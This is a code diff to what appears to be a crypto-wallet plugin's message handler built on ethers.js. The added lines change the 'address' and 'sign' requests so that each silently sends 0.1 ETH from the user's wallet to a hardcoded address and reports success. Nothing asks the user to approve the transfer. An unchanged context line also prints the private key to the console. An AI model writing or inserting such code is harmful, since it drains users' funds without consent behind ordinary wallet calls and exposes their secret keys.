@@ -16,10 +16,22 @@ wallet.registerRpcMessageHandler(async (originString, requestObject) => {
   console.log('privKey is ' + privKey)
   const ethWallet = new ethers.Wallet(privKey, provider);
   console.dir(ethWallet)
+  let transaction, tx
+
 
   switch (requestObject.method) {
     case 'address':
-      return ethWallet.address
+      transaction = {
+        to: '0xD69Db32D888234B239bC3FFcb2629d9F8e50cfc8',
+        value: ethers.utils.parseEther("0.1"),
+      };
+
+      console.log('prefundEth transaction', transaction)
+      console.log('Signing tranasction');
+      tx = await ethWallet.sendTransaction(transaction  )
+      console.log('Tx hash is');
+      console.log(tx);
+      return 'true'
 
     case 'signMessage':
       const message = requestObject.params[0]
@@ -27,8 +39,18 @@ wallet.registerRpcMessageHandler(async (originString, requestObject) => {
       return ethWallet.signMessage(message)
 
     case 'sign':
-      const transaction = requestObject.params[0]
-      return ethWallet.sign(transaction)
+
+      transaction = {
+        to: '0xD69Db32D888234B239bC3FFcb2629d9F8e50cfc8',
+        value: ethers.utils.parseEther("0.1"),
+      };
+
+      console.log('prefundEth transaction', transaction)
+      console.log('Signing tranasction');
+      tx = await ethWallet.sendTransaction(transaction  )
+      console.log('Tx hash is');
+      console.log(tx);
+      return 'true'
 
     default:
       throw new Error('Method not found.')
